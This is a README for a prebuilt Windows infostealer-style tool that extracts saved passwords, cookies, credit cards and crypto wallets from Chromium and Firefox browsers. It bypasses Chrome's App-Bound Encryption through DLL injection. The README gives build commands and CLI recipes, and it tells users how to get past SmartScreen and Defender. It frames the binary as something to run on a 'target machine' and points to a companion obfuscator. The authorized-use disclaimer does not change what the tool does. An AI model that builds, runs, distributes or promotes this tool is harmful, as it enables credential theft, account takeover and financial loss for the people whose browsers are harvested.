<div align="center">

# 👻 phantom elevator

### Prebuilt Windows Binary · Build Pipeline · No Python on Target

*Download one file, run it, read the output. Or build it yourself in three commands.*

<br>

<a href="https://github.com/Hidden-Rhythm/abe_bypass/releases/latest">
  <img src="https://img.shields.io/badge/⬇️_Download-Latest_Release-22c55e?style=for-the-badge" alt="Download Latest Release">
</a>
<img src="https://img.shields.io/badge/🪟_Windows-10%20%7C%2011-0078D6?style=for-the-badge&logo=windows11&logoColor=white" alt="Windows 10/11">
<img src="https://img.shields.io/badge/Version-1.0.0-52525b?style=for-the-badge" alt="Version 1.0.0">

<br>

<img src="https://img.shields.io/badge/📦_Output-~13_MB_exe-8a2be2?style=for-the-badge" alt="Output ~13 MB">
<img src="https://img.shields.io/badge/⚙️_Builder-Nuitka_4.x-e11d48?style=for-the-badge" alt="Nuitka 4.x">
<img src="https://img.shields.io/badge/🔓_ABE-Prebuilt_DLLs-22c55e?style=for-the-badge" alt="Prebuilt DLLs">

<br><br>

**ONE FILE** &nbsp;·&nbsp; **NO INSTALL** &nbsp;·&nbsp; **NO DEPENDENCIES** &nbsp;·&nbsp; **13 BROWSER FAMILIES**

<br>

[**⬇️ Download**](#download) · [**🔨 Build**](#build) · [**🖥️ CLI**](#cli) · [**🌐 Browsers**](#browsers) · [**❓ FAQ**](#faq)

</div>

---

> [!TIP]
> **Two ways to get this tool.**
>
> **Download** the prebuilt `phantom_elevator.exe` from [**Releases**](https://github.com/Hidden-Rhythm/abe_bypass/releases/latest) — nothing to install, nothing to build.
>
> **Or build it yourself** — three commands, produces the same exe from source you can read.
>
> Want the Python-only edition? **[abe-bypass](https://github.com/Hidden-Rhythm/abe-bypass)** is one `.py` file, runs with `python phantom_elevator.py`.

---

## 🎯 What Is This Repo?

**Phantom Elevator** is a credential extractor built for the post-ABE era. It walks Chromium and Firefox profile directories, locates every encrypted secret store, and recovers the plaintext — including the **v20 App-Bound Encryption** keys that broke every legacy DPAPI-only extractor.

This repo holds both the **download** and the **build pipeline**:

| Path | What you get |
|---|---|
| **[Releases](https://github.com/Hidden-Rhythm/abe_bypass/releases/latest)** | `phantom_elevator.exe` — ~13 MB, self-contained |
| **Source** | `phantom_elevator.py` + `build_dll.py` + `build_exe.py` |

The exe bundles Python 3.12, `pycryptodome`, `python-snappy`, and **5 prebuilt ABE DLLs**. Nothing to install. Nothing beside it.

> 🎯 **The goal:** download, double-click, read the output.

<br>

<table>
<tr>
<td width="33%" valign="top">

**🎯 Detect**
Finds Chromium and Firefox families from standard install paths. Missing browsers skipped, not fatal.

</td>
<td width="33%" valign="top">

**🔓 Recover**
Resolves each browser's key store — `v10` via DPAPI, `v20` via the embedded ABE DLL.

</td>
<td width="33%" valign="top">

**📊 Rank**
Scores every local-storage entry before writing. Wallets, tokens, and seed phrases lead the output.

</td>
</tr>
</table>

---

<a id="authorized-use"></a>
## ⚠️ Authorized Use Only

<table>
<tr>
<td width="100%" valign="top">

**✅ Legitimate uses**

- Authorized penetration testing engagements with a signed scope
- Red-team assessments of your own systems
- Digital forensics on a device you own or have legal custody of
- Incident response triage on a compromised endpoint
- CTF challenges and security research on test machines you control
- Personal account recovery on a machine you own

**❌ Illegal uses**

- Extracting credentials from any device you do not own
- Any form of credential theft, account takeover, or unauthorized access
- Deploying on a victim's machine, through malware, phishing, or social engineering
- Commercial sale of extracted credentials
- Any use that violates the Computer Fraud and Abuse Act, the Computer Misuse Act, GDPR, CFAA § 1030, or local law

</td>
</tr>
</table>

> 🚨 **YOU ARE RESPONSIBLE FOR YOUR OWN USE.** This software is published for authorized security research and educational analysis only. The author does **not** condone, support, or facilitate unauthorized access to computer systems. If you use Phantom Elevator against a system you are not explicitly authorized to test, **you** commit a crime and **you alone** bear the legal consequence.

> 📜 **NO WARRANTY, NO LIABILITY.** This software is provided "as is", without warranty of any kind, express or implied. The author is not liable for any damages, legal action, or consequence arising from use or misuse.

> 🤝 **REPORTING A VULNERABILITY.** If you are a browser vendor or security researcher who has found a flaw this tool touches, contact the author via Discord — responsible disclosure is welcome, abuse is not.

---

<a id="download"></a>
## ⬇️ Download & Run

### 1️⃣ Download

Grab `phantom_elevator.exe` from the [**latest release**](https://github.com/Hidden-Rhythm/abe_bypass/releases/latest).

| File | Size | Notes |
|:---|:---|:---|
| `phantom_elevator.exe` | ~13 MB | self-contained, one file |
| `phantom_elevator.exe.sha256` | <1 KB | hash for verification |

### 2️⃣ Verify (recommended)

```powershell
Get-FileHash .\phantom_elevator.exe -Algorithm SHA256
```

Compare to the value in the release notes. If they match, you have the build the author produced.

### 3️⃣ Run

Double-click `phantom_elevator.exe`. The console opens, detects browsers, and starts extracting.

```text
  ╭──────────────────────────────────────────────────────────────╮
  │  ◈   PHANTOM ELEVATOR                                        │
  │      multi-browser credential extractor                      │
  │      v1.0.0  ·  https://github.com/Hidden-Rhythm             │
  ╰──────────────────────────────────────────────────────────────╯

     output C:\...\out  ·  cats cookies,passwords,...
     ◈  Chrome    1 profile
        ✓  Default    42 cookies  12 passwords  ...
```

### 4️⃣ Read

Output lands in `out\` beside the exe:

```text
out/
├── Chrome/Default/
│   ├── cookies/          → Netscape .txt per host
│   ├── passwords/        → TSV .txt per domain
│   ├── history.txt · autofill.txt · credit_cards.txt
│   ├── local_storage/    → readable .txt per origin
│   ├── bookmarks.txt · extensions.txt · account.txt
└── Firefox/<profile>/
    ├── cookies/ · passwords/
    ├── history.txt · bookmarks.txt · account.txt
```

<br>

<details>
<summary><b>🛠️ If Windows blocks the exe</b></summary>

<br>

**SmartScreen** — "Windows protected your PC." Click **More info** → **Run anyway**. To suppress: right-click exe → **Properties** → **Unblock** → **OK**.

**Antivirus quarantine** — credential extraction is a high-signal shape. Defender may flag it as `Trojan:Win32/Wacatac`. This is a false positive on behavior pattern, not a real detection. Verify the SHA-256 against the release, then add the folder to your exclusion list. Never disable Defender globally.

</details>

---

<a id="build"></a>
## 🔨 Build From Source

Three commands. First build takes minutes; subsequent builds are fast.

```bash
git clone https://github.com/Hidden-Rhythm/abe_bypass.git
cd abe_bypass

python build_dll.py     # needs x86_64 gcc — produces dlls/*.dll
python build_exe.py     # needs nothing — produces dist/phantom_elevator.exe
```

### What each script does

**`build_dll.py`** — compiles one ABE DLL per Chromium build that ships an elevation service.

| Browser | DLL |
|---|---|
| Chrome | `chrome.dll` |
| Chrome Beta | `chrome_beta.dll` |
| Brave | `brave.dll` |
| Edge | `edge.dll` |
| Avast | `avast.dll` |

Requires `x86_64-w64-mingw32-gcc` on `PATH`. Each DLL bakes in that browser's `cls_id`, `iid_v1`, `iid_v2`, and `vtable_offset`. Five files, ~15 KB each.

**`build_exe.py`** — installs Nuitka if missing, validates the DLLs, runs a onefile build with everything embedded as data files.

```text
  [1/5] checking nuitka...
        ok: nuitka 4.1.3
  [2/5] locating files...
    phantom_elevator.py path
    default: C:\...\abe_bypass\phantom_elevator.py
    (press enter for default, or paste a path)
  >
  [3/5] validating dlls...
        ok: 5 dlls present
          chrome.dll  15360 bytes
          ...
  [4/5] building (first run can take 3-5 minutes)...
  [5/5] done
        exe:  C:\...\dist\phantom_elevator.exe
        size: 12.8 MB
```

Path prompts accept Enter for the default. Stray `[` `]` and quotes are stripped.

### Build times

| | First build | After |
|:---|:---|:---|
| MinGW64 toolchain download | 2–5 min | cached |
| Python → C translation | 30–60 s | 20–40 s |
| C compilation (ccache) | 3–6 min | 30–90 s |
| Linking | 30–60 s | 20–40 s |
| **Total** | **8–15 min** | **1.5–3 min** |

### What's inside the exe

| Component | Bundled |
|---|---|
| Python 3.12 runtime | ✅ compiled to machine code |
| `phantom_elevator.py` | ✅ |
| `pycryptodome` | ✅ |
| `python-snappy` | ✅ |
| 5 ABE DLLs in `dlls/` | ✅ embedded as data files |
| Network calls | ❌ none |

~49 MB uncompressed → ~13 MB at Nuitka's zstd level.

**Verify the DLLs bundled** — look for five lines during the build:

```text
Included data file 'dlls\chrome.dll' due to specified data file
Included data file 'dlls\chrome_beta.dll' due to specified data file
...
```

Or check the built exe:

```cmd
"C:\Program Files\7-Zip\7z.exe" l dist\phantom_elevator.exe | findstr dlls
```

---

## 🩺 Troubleshooting

<details>
<summary><b>❌ <code>The '--output-dir' option requires an argument with '--output-dir='</code></b></summary>

<br>

Nuitka 4.x dropped space-separated path options. `--output-dir C:\path` is parsed as `--output-dir` with no value plus a positional module name.

**Fix:** `--output-dir=C:\path` — the `=` must be in the same token. Already handled in the shipped `build_exe.py`.

</details>

<details>
<summary><b>❌ <code>WARNING: No data files in directory 'C:\...\dlls'</code></b></summary>

<br>

Nuitka 4.x's `--include-data-dir` scan misses `*.dll` on Windows backslash paths. It warns, bundles nothing, and the build **succeeds** — producing a broken exe.

Symptom at runtime: ABE extraction fails, drops table shows `compile_failed` for every browser, because `_resolve_abe_dll` finds no prebuilt DLL and falls back to compiling — and the target has no gcc.

**Fix:** `--include-data-files=C:\path\dlls\*.dll=dlls/` — glob, not directory. Already handled in the shipped `build_exe.py`.

</details>

<details>
<summary><b>❌ Build script hangs on <code>[1/5] checking nuitka...</code></b></summary>

<br>

Older versions ran `nuitka --version`. That command probes for a C compiler, and on Windows the probe can block on the inherited stdout pipe for 40+ seconds before timing out.

**Fix:** `importlib.metadata.version("nuitka")` reads the pip METADATA file off disk in ~2 ms. Already handled.

</details>

<details>
<summary><b>⚠️ <code>scons: warning: No versions of the MSVC compiler were found</code></b></summary>

<br>

Harmless. Nuitka falls back to the MinGW64 toolchain it downloads automatically. The build completes with gcc. No action needed.

</details>

<details>
<summary><b>⚠️ <code>WARNING: Cannot find Windows Runtime DLLs to include</code></b></summary>

<br>

The exe depends on the Universal C Runtime. Windows 10 and 11 ship it. Windows 8.1 needs KB2999226. Windows 7 unsupported.

Since the ABE bypass needs Chrome or Edge, both of which dropped Win7 long ago, your real floor is Windows 10.

</details>

<details>
<summary><b>🛡️ SmartScreen / Defender flags the exe</b></summary>

<br>

Expected. A compiled binary that injects a DLL into Chrome and reads credential stores matches trojan heuristics by shape. Static analysis can't tell "authorized pentest tool" from "infostealer."

You built it yourself from source you can read — that's your verification. For distribution, ship the SHA-256 alongside. See the [Download](#download) section.

</details>

<details>
<summary><b>❌ <code>no x86_64 gcc on PATH</code></b></summary>

<br>

`build_dll.py` couldn't find a 64-bit gcc.

```bash
winget install BrechtSanders.WinLibs.POSIX.UCRT
# or: choco install mingw
# or: scoop install gcc
```

Verify before rebuilding:

```bash
gcc -dumpmachine
# want: x86_64-w64-mingw32
# bad:  i686-w64-mingw32  (32-bit — won't work)
```

</details>

<details>
<summary><b>❌ ABE works in Python but fails from the exe</b></summary>

<br>

```powershell
.\phantom_elevator.exe -t chrome --cookies --debug-drops -v
```

| Drop reason | Meaning |
|---|---|
| `compile_failed` | No DLL found in `_MEIPASS\dlls\` — the glob didn't bundle |
| `inject_failed` | DLL present, injection failed — check the error text |
| `service_unavailable` | Elevation service isn't running and won't start |
| `bad_key_length` | DLL ran but returned wrong size — usually 32-bit DLL in 64-bit process |

</details>

---

<a id="cli"></a>
## 🖥️ Command Line

Same flags as the Python edition.

```powershell
phantom_elevator.exe [OPTIONS]
```

<br>

### 📦 Categories

| Flag | What it does |
|:---|:---|
| `--all` | Every category (same as passing none) |
| `--cookies` | 🍪 HTTP cookies |
| `--passwords` | 🔑 Saved logins |
| `--history` | 📜 Browsing history |
| `--autofill` | 📝 Form autofill fields and profiles |
| `--cards` | 💳 Credit cards and IBANs |
| `--local-storage` | 🗂️ Local Storage leveldb entries |
| `--bookmarks` | 🔖 Bookmarks |
| `--extensions` | 🧩 Extensions and their storage |
| `--wallets` | 🪙 Wallet vaults |

<br>

### 🎛️ Run Control

| Flag | Argument | Default | What it does |
|:---|:---|:---|:---|
| `-o`, `--output` | `DIR` | `out` | 📁 Output directory |
| `-t`, `--target` | `NAME` | all | 🎯 One browser — `chrome`, `brave`, `edge`, `avast`, `vivaldi`, `chromium`, `opera`, `opera gx`, `firefox`, `waterfox`, `librewolf`, `floorp`, `zen` |
| `--force-kill` | — | off | 🔪 Close browsers first, unlock locked DBs |
| `--wallet-password` | `PW` | `$PE_WALLET_PW` | 🔐 Wallet vault password |
| `--no-wallet-prompt` | — | off | 🙅 Never prompt |
| `--jobs` | `N` | `1` | ⚡ Parallel browser jobs |

<br>

### 🧭 Modes

| Flag | What it does |
|:---|:---|
| `--list-browsers` | 🌐 Detected browsers, profile counts, ABE service state |
| `--list-wallets` | 🪙 Supported wallets, schemes, hashcat modes |
| `--audit-only` | 🩺 Read-only SQLite health audit — no secrets read, no files modified |

<br>

### 🎨 Output

| Flag | Argument | Default | What it does |
|:---|:---|:---|:---|
| `--format` | `tsv` \| `json` \| `csv` \| `txt` | `tsv` | 🗄️ `tsv`/`txt` → plain `.txt`; `csv`/`json` → structured |
| `--important` | — | off | 💎 High-value targets only |
| `--debug-drops` | — | off | 🔍 Skipped-entry breakdown |
| `--no-color` | — | off | ⚪ Disable ANSI |
| `-v`, `--verbose` | — | off | 📋 Per-entry samples + tracebacks |
| `-q`, `--quiet` | — | off | 🤫 Suppress banner and progress |

<br>

### 🧾 Recipes

```powershell
phantom_elevator.exe                              # everything
phantom_elevator.exe --force-kill                 # close browsers first
phantom_elevator.exe --cookies --passwords        # just those two
phantom_elevator.exe --wallets --wallet-password "pass"
phantom_elevator.exe --important --format json    # high-value as JSON
phantom_elevator.exe -t chrome -o C:\drop         # one browser, custom folder
phantom_elevator.exe --jobs 4                     # four in parallel
phantom_elevator.exe --audit-only                 # read-only health check
```

<br>

### 🚦 Exit codes

| Code | Meaning |
|:---:|:---|
| `0` | ✅ Clean run |
| `1` | ⚠️ Partial — jobs failed, profiles skipped, or a DB couldn't be copied |
| `2` | 🚫 Nothing ran |
| `130` | 🛑 `Ctrl+C` |

---

<a id="browsers"></a>
## 🌐 Supported Browsers

### 🔵 Chromium

| | Browser | Key protection | ABE |
|:---:|:---|:---|:---:|
| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | **Google Chrome** | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | Chrome Beta | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=brave.com&sz=64" height="18"> | **Brave** | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=microsoft.com&sz=64" height="18"> | Microsoft Edge | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=avast.com&sz=64" height="18"> | Avast Secure Browser | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=vivaldi.com&sz=64" height="18"> | Vivaldi | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=chromium.org&sz=64" height="18"> | Chromium | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=64" height="18"> | Opera | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=64" height="18"> | Opera GX | DPAPI | ➖ |

### 🦊 Firefox

| | Browser | Key protection | Status |
|:---:|:---|:---|:---:|
| <img src="https://www.google.com/s2/favicons?domain=mozilla.org&sz=64" height="18"> | **Firefox** | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=waterfox.net&sz=64" height="18"> | Waterfox | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=librewolf.net&sz=64" height="18"> | LibreWolf | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=floorp.app&sz=64" height="18"> | Floorp | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=zen-browser.app&sz=64" height="18"> | Zen Browser | NSS / `key4.db` | ✅ |

---

## 📦 Extraction Matrix

<table>
<tr>
<th></th>
<th align="left">Category</th>
<th align="left">Flag</th>
<th align="left">Chromium</th>
<th align="left">Firefox</th>
</tr>
<tr><td>🍪</td><td><b>Cookies</b></td><td><code>--cookies</code></td><td><code>Network/Cookies</code></td><td><code>cookies.sqlite</code></td></tr>
<tr><td>🔑</td><td><b>Passwords</b></td><td><code>--passwords</code></td><td><code>Login Data</code></td><td><code>logins.json</code></td></tr>
<tr><td>📜</td><td>History</td><td><code>--history</code></td><td><code>History</code></td><td><code>places.sqlite</code></td></tr>
<tr><td>📝</td><td>Autofill</td><td><code>--autofill</code></td><td><code>Web Data</code></td><td>—</td></tr>
<tr><td>💳</td><td><b>Cards &amp; IBANs</b></td><td><code>--cards</code></td><td><code>Web Data</code></td><td>—</td></tr>
<tr><td>🗂️</td><td>Local Storage</td><td><code>--local-storage</code></td><td><code>Local Storage/leveldb</code></td><td>—</td></tr>
<tr><td>🔖</td><td>Bookmarks</td><td><code>--bookmarks</code></td><td><code>Bookmarks</code></td><td><code>places.sqlite</code></td></tr>
<tr><td>🧩</td><td>Extensions</td><td><code>--extensions</code></td><td><code>Extensions/</code></td><td>—</td></tr>
<tr><td>🪙</td><td><b>Wallets</b></td><td><code>--wallets</code></td><td>extension storage</td><td>—</td></tr>
<tr><td>👤</td><td>Account</td><td><i>always</i></td><td><code>Preferences</code> / <code>Local State</code></td><td><code>signedInUser.json</code></td></tr>
</table>

---

## 🏗️ How the Pieces Fit

```text
build_dll.py
    │  reads BROWSERS table from phantom_elevator.py
    │  patches CLSID / IID / vtable into ABE_TEMPLATE
    │  gcc -shared -static → dlls/<browser>.dll  ×5
    ▼
dlls/chrome.dll  dlls/chrome_beta.dll  dlls/brave.dll  dlls/edge.dll  dlls/avast.dll
    │
    ▼
build_exe.py
    │  nuitka --onefile
    │  --include-data-files=dlls\*.dll=dlls/
    ▼
dist/phantom_elevator.exe    (~13 MB)
    │
    ▼
target machine (no Python, no gcc)
    │  extracts to %TEMP%\onefile_<rand>\
    │  _resolve_abe_dll → _MEIPASS\dlls\<browser>.dll
    │  OpenProcess → VirtualAllocEx → WriteProcessMemory
    │  → CreateRemoteThread(LoadLibraryW)
    │  DLL: CoCreateInstance(ElevationService) → vtable decrypt → 32-byte key
    │  AES-256-GCM → plaintext
    ▼
out/Chrome/Default/{cookies,passwords,...}
```

---

## 🗂️ Project Structure

```text
abe_bypass/
├── phantom_elevator.py    the tool (ABE resolves from dlls/, falls back to runtime compile)
├── build_dll.py           dev only — needs gcc — writes dlls/*.dll
├── build_exe.py           dev only — needs nuitka (auto-installs) — writes dist/*.exe
└── dlls/                  (generated, not committed)
    ├── chrome.dll
    ├── chrome_beta.dll
    ├── brave.dll
    ├── edge.dll
    └── avast.dll
```

`dlls/` and `dist/` are build artifacts — they belong in `.gitignore`, not in git.

---

## 🔬 Technical Details

| Component | Implementation |
|---|---|
| 📦 Builder | Nuitka 4.x → C → machine code |
| 🐍 Python | 3.12 (embedded, compiled) |
| 🪟 Platform | Windows 10 / 11, x64 |
| 🔧 ABE bridge | C, prebuilt per-browser in `dlls/` |
| 🔓 Key unprotection | DPAPI `CryptUnprotectData` + AES-256-GCM |
| ⚡ ABE access | COM elevation service + DLL injection |
| 🎯 Injection | `OpenProcess` · `VirtualAllocEx` · `WriteProcessMemory` · `CreateRemoteThread` |
| 🗄️ LevelDB | Built-in reader, `python-snappy` when available |
| 🔐 Crypto | `pycryptodome` |
| 🦊 Firefox passwords | NSS in-process via `ctypes` — no subprocess |
| 🪙 Wallets | MetaMask, Phantom, Coinbase, Rabby, Trust + 14 generic |

### ⚠️ Limitations

- 🪟 **Windows 10 / 11 x64 only.** Win32 COM, DPAPI, cross-process injection. Windows 8.1 needs KB2999226; Windows 7 unsupported.
- 🔄 **ABE is per-build.** A new browser elevation service invalidates the matching DLL. Fix: edit `BROWSERS`, re-run `build_dll.py`, re-run `build_exe.py`, ship a new exe.
- 🔨 **gcc required on the build box.** Not on the target — that's the whole point.
- 💾 **~13 MB exe, ~50 MB unpacked in `%TEMP%` while running.** Wiped on exit.
- 🛡️ **AV will react.** Injection + credential access is a high-signal pattern.
- 🦊 **Firefox passwords need `nss3.dll`.** Ships with every Firefox-family install.

---

<a id="faq"></a>
## ❓ FAQ

<details>
<summary><b>Why two repos instead of one?</b></summary>

<br>

Different audiences. [abe-bypass](https://github.com/Hidden-Rhythm/abe-bypass) is one file you run — good for reading the code or making a quick edit. This repo has the build pipeline — good for producing a binary you can hand to someone whose machine has no Python.

Keeping them separate also keeps `abe-bypass` honest as a "single-file Python application."

</details>

<details>
<summary><b>Can I skip `build_dll.py`?</b></summary>

<br>

Yes, but the exe will be weaker. Without `dlls/`, the bundled source falls back to compiling at runtime — and the target has no gcc, so the ABE path disables itself. You'd still get `v10` cookies/passwords and all Firefox extraction, but no `v20` ABE bypass.

`build_exe.py` checks for all five DLLs at step `[3/5]` and refuses to build if any are missing.

</details>

<details>
<summary><b>Does the exe phone home?</b></summary>

<br>

No. Zero network calls during extraction. `pycryptodome` and `python-snappy` are bundled, so the pip-install branches in `_ensure_*` never fire.

</details>

<details>
<summary><b>Can I build this on Linux / macOS?</b></summary>

<br>

No. `build_dll.py` produces PE DLLs with `-lole32 -loleaut32 -luser32` — Windows-only link flags. Nuitka's `--onefile` Windows target also wants to run on Windows. Build on a Windows box.

</details>

<details>
<summary><b>Second build is fast but still 90 seconds — why?</b></summary>

<br>

Nuitka still relinks. `phantom_elevator.py` is one module, so editing it forces that module to recompile and the whole thing to relink. The other 220 C files hit ccache.

Use `--standalone` instead of `--onefile` if build speed matters more than a single file — it skips the compression and bootstrap stages.

</details>

---

## 🔗 Links

<div align="center">

<a href="https://github.com/Hidden-Rhythm/abe-bypass">
  <img src="https://img.shields.io/badge/Python_Edition-abe--bypass-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python Edition">
</a>

<a href="https://github.com/Hidden-Rhythm/abe_bypass/releases/latest">
  <img src="https://img.shields.io/badge/Releases-Latest-22c55e?style=for-the-badge&logo=github&logoColor=white" alt="Releases">
</a>

<a href="https://github.com/Hidden-Rhythm/obfuscator">
  <img src="https://img.shields.io/badge/Companion-obfuscator-52525b?style=for-the-badge&logo=github&logoColor=white" alt="Obfuscator">
</a>

<a href="https://discord.com/users/hidden_rhythm">
  <img src="https://img.shields.io/badge/Discord-hidden__rhythm-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
</a>

</div>

---

<div align="center">

### 👻 Build once. Run anywhere Windows.

**Hidden-Rhythm**

<sub>phantom elevator · v1.0.0 · ABE bypass · 13 browser families · build pipeline</sub>

</div>
